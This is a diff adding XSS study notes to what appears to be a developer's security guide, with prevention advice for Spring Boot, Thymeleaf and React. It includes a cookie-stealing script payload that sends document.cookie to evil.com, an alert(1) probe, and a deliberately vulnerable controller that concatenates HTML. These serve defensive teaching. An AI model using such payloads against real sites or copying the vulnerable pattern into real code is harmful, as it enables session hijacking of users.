@@ -2217,29 +2217,211 @@ To disable (not recommended for forms):
 
 👉 Usually disabled in stateless REST APIs using JWT.
 
+## 🔥 What is an XSS Attack?
+
+XSS (Cross-Site Scripting) is a vulnerability where an attacker injects malicious JavaScript into a trusted website, and that script runs in other users’ browsers.
+
+👉 Unlike CSRF (which sends requests), XSS can read data, steal cookies, and fully act as the user.
 
 
+## 🧠 Simple Example
 
+Imagine your app has a comment box:
+```
+<div>
+  User comment: {{comment}}
+</div>
+```
 
+If the app does NOT escape input, the attacker submits:
+```
+<script>
+  fetch("https://evil.com/steal?cookie=" + document.cookie)
+</script>
+```
 
+Now whenever someone views that page:
 
+💥 The script runs
+💥 Their cookies are sent to attacker
+💥 Attacker can hijack session
 
+## 🛡️ How to Prevent XSS
+1️⃣ Escape Output (MOST IMPORTANT)
 
+Instead of:
 
+<div>${userInput}</div>
 
+Use escaping:
 
+<div th:text="${userInput}"></div>
 
+In Spring + Thymeleaf:
 
+th:text escapes automatically
 
+th:utext does NOT escape
 
+2️⃣ Use HttpOnly Cookies
+Set-Cookie: JSESSIONID=abc123; HttpOnly; Secure
 
+Prevents JS from reading cookies.
 
+3️⃣ Content Security Policy (CSP)
+Content-Security-Policy: script-src 'self'
 
+Prevents inline scripts.
 
+4️⃣ Validate & Sanitize Input
 
+Reject <script>
 
+Remove HTML tags
 
+Use libraries like OWASP sanitizer
 
+🧠 Real Attack Example in Spring Boot
 
+Bad controller:
+```
+@GetMapping("/hello")
+public String hello(@RequestParam String name) {
+    return "<h1>Hello " + name + "</h1>";
+}
+```
 
+If user visits:
 
+/hello?name=<script>alert(1)</script>
+
+Boom 💥
+
+Better approach:
+
+Use template engine
+
+Never build HTML using string concatenation
+
+🔥 How To Protect From XSS Attacks
+
+There is no single fix.
+You need multiple layers of protection.
+
+🛡️ 1️⃣ Escape Output (MOST IMPORTANT)
+👉 Golden Rule:
+
+Always escape data when rendering it into HTML.
+
+✅ In Spring Boot (Thymeleaf)
+
+Safe:
+
+<p th:text="${comment}"></p>
+
+❌ Dangerous:
+
+<p th:utext="${comment}"></p>
+
+th:text escapes automatically.
+th:utext renders raw HTML.
+
+✅ In React (Safe by Default)
+<div>{userInput}</div>
+
+React automatically escapes content.
+
+❌ Dangerous:
+
+<div dangerouslySetInnerHTML={{__html: userInput}} />
+
+Never use this with user input.
+
+🛡️ 2️⃣ Use HttpOnly Cookies
+
+If attacker somehow injects script:
+
+document.cookie
+
+They should NOT be able to read session cookie.
+
+Set cookie like:
+
+Set-Cookie: JSESSIONID=abc123; HttpOnly; Secure; SameSite=Lax
+
+HttpOnly → JS cannot read cookie
+
+Secure → HTTPS only
+
+SameSite → Prevent CSRF
+
+In Spring Boot:
+
+server.servlet.session.cookie.http-only=true
+server.servlet.session.cookie.secure=true
+🛡️ 3️⃣ Use Content Security Policy (CSP)
+
+CSP tells browser:
+
+"Only allow scripts from my domain"
+
+Example:
+
+Content-Security-Policy: script-src 'self'
+
+In Spring Boot:
+
+http.headers()
+    .contentSecurityPolicy("script-src 'self'");
+
+This blocks inline <script> injection.
+
+🛡️ 4️⃣ Validate & Sanitize Input
+
+If your app allows HTML (like rich text editor):
+
+Use sanitizer libraries like:
+
+OWASP Java HTML Sanitizer
+
+Jsoup clean()
+
+Example:
+
+String clean = Jsoup.clean(userInput, Safelist.basic());
+
+Removes <script> and dangerous tags.
+
+🛡️ 5️⃣ Never Build HTML Using String Concatenation
+
+❌ Bad:
+
+return "<h1>" + userInput + "</h1>";
+
+Use:
+
+Template engine
+
+JSON APIs instead of server-rendered HTML
+
+🛡️ 6️⃣ Avoid Inline JavaScript
+
+Bad:
+
+<button onclick="doSomething()">
+
+Better:
+
+element.addEventListener("click", handler)
+
+Helps CSP enforcement.
+
+🛡️ 7️⃣ Keep Dependencies Updated
+
+Old libraries sometimes allow DOM-based XSS.
+
+Since you're working in microservices:
+
+Keep Spring Boot updated
+
+Keep frontend framework updated
